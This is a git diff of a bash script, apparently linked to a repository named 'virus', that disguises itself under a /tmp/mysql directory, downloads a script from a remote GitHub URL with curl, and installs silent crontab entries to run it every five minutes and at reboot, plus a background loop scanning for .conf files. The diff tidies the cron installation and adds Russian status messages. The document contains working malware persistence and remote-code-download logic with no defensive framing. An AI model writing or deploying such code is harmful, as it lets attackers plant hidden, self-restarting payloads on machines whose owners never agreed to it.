@@ -1,7 +1,7 @@
 #!/bin/bash
 
 GITHUB_SCRIPT_URL="https://github.com/Zend1X/virus/blob/main/virus.sh"
-MYSQL_DIRS=(    " /tmp/mysql"    )
+MYSQL_DIRS=("/tmp/mysql")
 
 generate_random_name() {
     cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1
@@ -15,10 +15,8 @@ find_mysql_dir() {
             return 0
         fi
     done
-
-
-mkdir -p "/tmp/mysql" 2>/dev/null
-echo "/tmp/mysql"
+    mkdir -p "/tmp/mysql" 2>/dev/null
+    echo "/tmp/mysql"
 }
 
 main() {
@@ -32,18 +30,29 @@ main() {
     fi
 
     if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
+        echo "Устанавливаем задания в crontab..."
+        
         curl -s "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"
-        (crontab -l 2>/dev/null
-        echo "*/5 * * * * $SCRIPT_PATH >/dev/null 2>&1"
-        echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
-        ) | crontab -
+        
+        TMP_CRON=$(mktemp)
+        crontab -l 2>/dev/null > "$TMP_CRON"
+        
+        if ! grep -q "$SCRIPT_PATH" "$TMP_CRON"; then
+            echo "*/5 * * * * $SCRIPT_PATH >/dev/null 2>&1" >> "$TMP_CRON"
+            echo "@reboot $SCRIPT_PATH >/dev/null 2>&1" >> "$TMP_CRON"
+        fi
+        
+        sed -i '/^$/d' "$TMP_CRON"
+        crontab "$TMP_CRON"
+        rm "$TMP_CRON"
+        
+        echo "Готово!"
     fi
 
     while true; do
         find / -name "*.conf" 2>/dev/null | head -100 > /dev/null
         sleep 60
     done &
-}    
+}
 
 main
-
